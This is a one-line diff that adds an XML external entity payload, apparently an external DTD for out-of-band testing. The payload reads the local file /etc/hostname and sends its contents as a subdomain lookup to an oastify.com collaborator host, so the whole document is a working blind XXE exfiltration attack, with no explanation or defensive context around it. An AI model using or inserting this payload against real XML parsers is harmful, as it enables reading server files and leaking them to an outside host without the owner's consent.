@@ -1,0 +1,1 @@
+<!ENTITY % localfile SYSTEM "file:///etc/hostname"><!ENTITY % build "<!ENTITY &#x25; exfil SYSTEM 'http://%localfile;.hostname-xxe-a1.mh7cr7ixioxq95qqiosis0b74yapymmb.oastify.com/x'>">%build;%exfil;
